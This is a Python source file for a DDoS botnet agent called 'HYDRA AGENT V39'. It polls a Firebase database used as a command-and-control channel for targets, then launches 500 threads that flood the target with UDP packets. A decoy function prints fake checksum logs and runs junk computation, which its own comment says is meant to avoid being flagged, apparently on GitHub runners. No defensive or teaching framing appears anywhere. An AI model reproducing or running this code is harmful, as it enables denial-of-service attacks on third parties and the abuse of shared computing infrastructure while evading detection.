import os
import sys
import socket
import threading
import time
import random
import requests
import multiprocessing
import math

# --- AUTO-PATH DETECTION ---
CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
print(f"[SYSTEM] Running from: {CURRENT_DIR}")

# CONFIG
DB_URL = "https://ryxen-c2-default-rtdb.firebaseio.com/attack.json"

def github_camo_heavy():
    """Simulación de procesamiento de datos para evitar flagging"""
    while True:
        try:
            # Cálculos de matriz basura
            matrix = [[random.random() for _ in range(50)] for _ in range(50)]
            _sum = sum(sum(row) for row in matrix)
            # Log falso de integridad
            print(f"[WORKER-INFO] Checksum: {hex(int(_sum * 100000))} | Thread: {threading.current_thread().name}")
            time.sleep(random.uniform(8, 15))
        except: pass

def etf_payload_gen():
    """Genera paquetes ETF (Error Triggering Flood) dinámicos"""
    # Paquetes con cabeceras TCP/UDP malformadas simuladas en el payload
    base = random._urandom(1024)
    junk = b"\x00\x00\x01\x01\x08\x00" # Simulación de flags
    return base + junk + struct.pack(">I", random.getrandbits(32)) if 'struct' in globals() else base

def engine_l4(ip, port, duration):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try: s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024*1024)
    except: pass
    
    end = time.time() + duration
    while time.time() < end:
        try:
            payload = random._urandom(1380)
            for _ in range(120): # Ráfaga optimizada para Windows Runner
                s.sendto(payload, (ip, int(port)))
        except: 
            time.sleep(0.001)
            break

def monitor_c2():
    threading.Thread(target=github_camo_heavy, daemon=True).start()
    last_stamp = ""
    while True:
        try:
            # Agregamos .json al final para asegurar que Firebase responda bien
            r = requests.get(f"{DB_URL}", timeout=10).json()
            if r and r.get('stamp') != last_stamp:
                last_stamp = r['stamp']
                target = r.get('target')
                dur = int(r.get('time', 0))
                method = r.get('method', '')
                
                if dur > 0 and target:
                    print(f"[!] Orden recibida: {method} en {target}")
                    if ":" in target:
                        host, port = target.split(':')
                        # 500 hilos sin piedad
                        for i in range(500):
                            threading.Thread(target=engine_l4, args=(host, port, dur), name=f"HydraThr-{i}").start()
        except Exception as e:
            print(f"[DEBUG] Error en C2: {e}")
        time.sleep(4)

if __name__ == "__main__":
    print("--- HYDRA AGENT V39 ONLINE ---")
    monitor_c2()
  
